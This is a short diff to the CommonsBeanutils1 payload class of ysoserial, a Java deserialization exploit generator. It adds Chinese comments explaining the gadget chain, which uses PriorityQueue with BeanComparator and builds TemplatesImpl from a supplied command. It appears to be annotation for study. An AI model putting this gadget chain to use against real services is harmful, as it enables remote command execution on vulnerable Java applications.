@@ -17,6 +17,8 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
     public Object getObject(final String command) throws Exception {
+//        和beanshell1很像，都是PriorityQueue队列用一个Comparator比较器
+        //利用的是CommonsBeanutils里的BeanComparator比较器里的compare方法。
         final Object templates = Gadgets.createTemplatesImpl(command);
         // mock method name until armed
         final BeanComparator comparator = new BeanComparator("lowestSetBit");
